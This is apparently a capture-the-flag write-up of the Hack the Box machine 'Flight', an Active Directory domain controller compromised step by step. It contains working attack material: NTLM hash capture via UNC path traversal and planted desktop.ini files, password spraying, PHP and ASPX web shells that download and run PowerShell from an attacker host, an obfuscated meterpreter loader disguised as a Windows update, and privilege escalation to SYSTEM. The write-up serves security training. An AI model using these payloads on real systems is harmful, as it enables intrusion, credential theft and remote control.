---
title: "HTB • Flight"
tags:
  - "Windows"
  - "Web"
  - "PHP"
  - "Hard Difficulty"
  - "Advanced"
  - "SMB"
  - "Active Directory"
  - "PowerShell"
excerpt: "Flight is a hard windows machine on Hack the Box that involves web exploitation, web shells, NTLM theft, SMB, PHP, and ASP.NET"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-flight/"
---

_Flight_ is a hard windows machine created by [**Geiseric**](https://app.hackthebox.com/users/184611) on [**Hack the Box**](https://app.hackthebox.com/machines/MetaTwo) that features a vulnerable Active Directory domain controller. The machine hosts a web server that enables attackers to read local files or UNC paths, which we use to get the password for the user **svc_apache**. This user also shares their password with another user, **S.Moon**. We use _S.Moon_'s account to trick the user **C.Bum** into leaking a crackable NTLM authentication attempt, from which we recover the password. we then use _C.Bum_'s account to write and execute a PHP web shell on the target, from which we can upload another web shell that is then executed by **IIS APPPOOL\DefaultAppPool**. We finally use this identity to abuse a special privilege to get access as **NT AUTHORITY\SYSTEM**

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # Target IP address
lhost="" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

Some of the more relevant open TCP ports reported in the scan include:

| Port | Service | Product                    | Version | Fingerprints             |
|:-----|:--------|:---------------------------|:--------|:-------------------------|
| 53   | DNS     | Simple DNS Plus            |         |                          |
| 80   | HTTP    | Apache httpd               | 2.4.52  | OpenSSL/1.1.1m PHP/8.1.1 |
| 88   | KRB     | Windows Kerberos           |         |                          |
| 135  | MSRPC   | Windows RPC                |         |                          |
| 389  | LDAP    | Active Directory LDAP      |         |                          |
| 445  | SMB     |                            |         |                          |
| 5985 | WinRM   |                            |         |                          |

Based on the presence of open ports **88/TCP** and **389/TCP**, we'll assume that this machine is an Active Directory domain controller. We can also locate the domain name as **flight.htb** in the scan results.

```bash
#bryan@attacker
echo domain=flight.htb >> .env && . ./.env
```
{:.nolineno}

## Web

We'll begin by visiting the HTTP server running on port 80.

```bash
# bryan@attacker
mkdir logs/web
curl -si $rhost | tee logs/web/index.http
cat logs/web/index.http | grep -i flight # Check for hostname
```
{:.nolineno}

It looks like the site might expect the hostname _flight.htb_. let's check for subdomains with [ffuf](https://github.com/ffuf/ffuf).

```bash
# bryan@attacker
ffuf -u http://$rhost -H Host:\ FUZZ.$domain -w ~/wordlist/subdomains-100k.txt -mc all -fs 7069
```
{:.nolineno}

the server returns a different response when given the hostname **school.flight.htb** in the host header. We'll add this virtual hostname to our `/etc/hosts`{:.filepath} file and continue.

```bash
# bryan@attacker
echo -e $rhost\\t$domain\ school.$domain | sudo tee -a /etc/hosts
```
{:.nolineno}

### School Site

When navigating to [https://school.flight.htb/](https://school.flight.htb/) in our browser, we find a simple site with a few links to other pages.

![Flight school homepage](school.png)
_The flight school home page_

The _About Us_ page at [/index.php?view=about.html](http://school.flight.htb/index.php?view=about.html) presents some interesting, potentially dangerous functionality. `index.php`{:.filepath} seems to use the _view_ parameter to fetch a resource from the local filesystem and print the contents. We notice that our request gets filtered when we use backslashes as our directory separator to request files.

![Filtered path](filtered.png)
_Our request is filtered when we use backslashes in the view parameter_

However, when we request a file using the forward slash directory separator like [/index.php?view=./about.html](http://school.flight.htb/index.php?view=./about.html), we successfully fetch the file. With this in mind, let's try to traverse the filesystem and read another file that might exist on Windows like `C:\Windows\win.ini`{:.filepath}.

![Path traversal](traversal.png)
_We successfully read C:\Windows\win.ini_

It works! Since we're on Windows and we control the entire file path, we could potentially use an UNC path to capture a crackable NTLM authentication attempt.

```bash
# bryan@attacker
sudo responder -I tun0
```
{:.nolineno}
```bash
# bryan@attacker
curl "http://school.flight.htb/index.php?view=//$lhost/x/test.jpg"
```
{:.nolineno}

![Responder callback](responder.png)
_We capture an NTLM authentication attempt over SMB_

We get the authentication attempt formatted into a crackable hash. We'll copy this to a file and use [John the Ripper](https://github.com/openwall/john) to try to crack it.

```bash
# bryan@attacker
john ./netntlmv2.txt --wordlist=~/wordlist/rockyou.txt # use classic rockyou.txt wordlist
```
{:.nolineno}

The hash for _svc\_apache_ is successfully cracked and we recover the password `S@Ss!K@*t13`.

## Active Directory

### Password Spraying

Let's use the credentials we found with a simplified version of impacket's `GetADUsers.py`{:.filepath} from [here](https://github.com/bryanmcnulty/ctf-scripts/blob/main/active_directory/simple-GetADUsersLDAP.py) to gather a list of domain users. Then we'll then spray each user with the known password.

```bash
# bryan@attacker
./simple-GetADUsersLDAP.py $domain/svc_apache:'S@Ss!K@*t13' | tee adusers.txt
kerbrute -d $domain --dc $rhost passwordspray adusers.txt 'S@Ss!K@*t13'
```
{:.nolineno}

The password is also valid for the user **_S.Moon_**.

### SMB

With our valid credentials, we'll get a list of SMB shares on the machine using [smbmap](https://github.com/ShawnDEvans/smbmap).

```bash
# bryan@attacker
mkdir logs/smb
for u in svc_apache S.Moon
  do smbmap -H $rhost -p 'S@Ss!K@*t13' -u $u | tee logs/smb/$u-smbmap.log
done
```
{:.nolineno}

There are three non-standard shares being served: _Shared_, _Users_, and _Web_. We notice that _S.Moon_ has write access to the shared called _Shared_, while _svc\_apache_ does not.

```bash
# bryan@attacker
smbclient -U S.Moon //$rhost/Shared | tee -a logs/smb/S.Moon-smbclient.log
```
{:.nolineno}

The share doesn't seem to have anything in it though. Since we seem to have write access, we'll try uploading a file produced by [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) and see if we get a callback.

```bash
# bryan@attacker
./ntlm_theft.py -g all -s $lhost -f important
```
{:.nolineno}

We'll just start up Responder, upload all of the files, and pray that a user browses to this directory.

```bash
# bryan@attacker
sudo responder -I tun0 -v # Start listening for callbacks
```
{:.nolineno}
```bash
# bryan@attacker
cd important # Enter NTLM stealer directory
(echo 'S@Ss!K@*t13' | smbclient -U S.Moon //$rhost/Shared -c "prompt;mput *") |
  tee -a logs/smb/S.Moon-smbclient.log
```
{:.nolineno}

We hit an access error when uploading most of the files, but we do successfully upload `desktop.ini`{:.filepath} which involves very little user interaction. After some time, we get a callback from the user **_C.Bum_**.

![NTLM Theft](theft.png)
_We read an NTLM authentication attempt for the user C.Bum_

We'll attempt to crack this hash with John the Ripper as we did before.

```bash
# bryan@attacker
john netntlmv2.txt --wordlist=~/wordlist/rockyou.txt # use classic rockyou.txt wordlist
```
{:.nolineno}

We recover the password `Tikkycoll_431012284` for the user _C.Bum_.

### Domain Enumeration

We'll use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) to gather domain information that will be ingested by [BloodHound](https://github.com/BloodHoundAD/BloodHound).

```bash
# bryan@attacker
bloodhound-python -u 'svc_apache' -p 'S@Ss!K@*t13' -d $domain \
  -ns $rhost --zip --auth-method ntlm -w 4 -c All,LoggedOn
```
{:.nolineno}

Now we'll load the archive into BloodHound, mark _svc\_apache_, _S.Moon_, and _C.Bum_ as owned, and begin to search for relevant information.

#### BloodHound

Unlike our other two owned users, _C.Bum_ is a member of a non-standard group called **_WebDevs_**. 

![C.Bum Groups](groups.png)
_C.Bum is a member of a custom group_

We suspect that this group has some privileges that would make sense for a web developer. Let's check the account's access to the _Web_ share we spotted earlier.

```bash
# bryan@attacker
smbmap -u C.Bum -p 'Tikkycoll_431012284' -H $rhost | tee logs/smb/C.Bum-smbmap.log
```
{:.nolineno}

The user _C.Bum_ has write access to the _Web_ share. If we can write to the web root, we could potentially execute code with a web shell.

```bash
# bryan@attacker
smbclient -U C.Bum //$rhost/Web | tee -a logs/smb/C.Bum-smbclient.log
```
{:.nolineno}

The share does seem to access the web roots of both sites we visited earlier. Writing to the school site is certainly more valuable because it could allow us to execute PHP code.

## Remote Access

Let's assemble a PHP script with a command to establish a meterpreter shell on the target.

```php
<?php
$lhost="10.10.14.9";
$cmd="powershell -ep bypass -w hidden -nop -c \"iex(iwr -useb $lhost).content\"";
echo `$cmd`;
?>
```
{:file="j7An4l.php"}

This PHP file should execute a powershell script that we will host on port 80 at `/`{:.filepath}. We'll populate this file with a script that will download and execute another file that will be our meterpreter, hosted at `/home.html`{:.filepath}. To evasively load the meterpreter we'll use [this custom script](https://github.com/bryanmcnulty/ctf-scripts/blob/main/windows/evasion/scxor.py).

First we'll setup our meterpreter and generate our shellcode.

```bash
# bryan@attacker
lport="443"
password=$(openssl rand -base64 12)
cmd="use windows/x64/meterpreter/reverse_tcp_rc4"
cmd="$cmd;set lhost $lhost;set lport $lport;set rc4password $password"
cmd="$cmd;generate -f raw -o mtp.bin;to_handler"
msfconsole -x "$cmd"
```
{:.nolineno}

Then we'll compile the shellcode into the evasive loader, making sure to save the key from the output.

```bash
# bryan@attacker
python3 scxor.py -f mtp.bin | tee logs/obf.log # !! SAVE THIS KEY !!
mkdir serve && mv simple.exe serve/home.html
```
{:.nolineno}
```powershell
$lhost="10.10.14.9" # Listener host
$c="[CHANGE ME]" # The key from scxor.py
$n="WindowsUpdate_$env:UserName" # Process name

iwr -useb "$lhost/home.html" -o "$env:Temp\$n.exe";
kill -Name $n -EA silent
Start-Process $f -arg $c
```
{:file="serve/index.html"}

Finally, we'll serve the payloads over HTTP port 80, upload the PHP file to the school site's web root in the _Web_ share, and visit the PHP file to trigger execution.

```bash
# bryan@attacker
cd serve && python3 -m http.server --bind $lhost 80
```
{:.nolineno}
```bash
# bryan@attacker
from="j7An4l.php"
to="school.flight.htb/images"
(echo 'Tikkycoll_431012284' | smbclient -U C.Bum //$rhost/Web -c "cd $to;put $from") |
  tee -a logs/smb/S.Moon-smbclient.log &&
  curl "http://school.flight.htb/images/$from"
```
{:.nolineno}

Upon fetching the file at [/images/j7An4l.php](http://school.flight.htb/images/j7An4l.php), we get a callback to our metasploit listener and establish a meterpreter session.

## Privilege Escalation

Using our meterpreter, we find out that there is a service running on port **8000** that we can only access locally.

```powershell
# svc_apache@flight.htb (powershell)
mkdir C:\Update
cd C:\Update
netstat -ano -p TCP | Tee-Object netstat.log
```
{:.nolineno}

Since this is a common alternate web port, we'll try to fetch <http://127.0.0.1:8000/> using PowerShell.

```powershell
# svc_apache@flight.htb (powershell)
$r = IWR -UseBasic "127.0.0.1:8000"
$r.Headers
```
{:.nolineno}

The site seems to be running IIS with ASP.NET, which is interesting because the server we accessed before on port 80 was running Apache with PHP. The web root for this site should be somewhere in the `C:\inetpub`{:.filepath} folder, which is default for IIS sites.

```powershell
# svc_apache@flight.htb (powershell)
ls -Force C:\inetpub
```
{:.nolineno}

There are actually two web roots here: `C:\inetpub\wwwroot`{:.filepath} and `C:\inetpub\development`{:.filepath}, with the development site being the one in use. We become curious if any of our owned users, all of which have some relation to web development, can write to this folder. Let's check the ACL.

```powershell
# svc_apache@flight.htb (powershell)
Get-Acl C:\inetpub\development | fl
```
{:.nolineno}

It seems like _C.Bum_ can write to this folder. We could potentially use this access to upload an ASP web shell and get execution as the default IIS user. We'll use [RunasCs](https://github.com/antonioCoco/RunasCs) to move a web shell to that folder as _C.Bum_, making sure to replace the listener host in the web shell.

```html
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
  ProcessStartInfo p=new ProcessStartInfo();
  p.FileName="powershell";
  p.Arguments="-Command iex(iwr -useb 10.10.14.9).content";
  Process.Start(p);
}
</script>
```
{:file="x.aspx"}
```powershell
# svc_apache@flight.htb (powershell)
.\RunasCs.exe C.Bum Tikkycoll_431012284 "whoami" # Verify execution
.\RunasCs.exe C.Bum Tikkycoll_431012284 "copy C:\Update\x.aspx C:\inetpub\development"
IWR -UseBasic "http://127.0.0.1:8000/x.aspx"
```
{:.nolineno}

Once we trigger the payload, we get a callback to our HTTP server, then a new meterpreter session is established as the user **_IIS APPPOOL\DefaultAppPool_**. Using metasploit's `getprivs` command on our new meterpreter session, we discover that this user has the **SeImpersonatePrivilege** right. We can abuse this with metasploit's `getsystem` command while specifying the reliable EfsPotato technique.

```bash
# IIS APPPOOL\DefaultAppPool@flight.htb (meterpreter)
getsystem -t 6
getuid
```
{:.nolineno}

At this point, we have a shell as **_NT AUTHORITY\SYSTEM_** and we can read both flags at `C:\Users\C.Bum\Desktop\user.txt`{:.filepath} and `C:\Users\Administrator\Desktop\root.txt`{:.filepath}.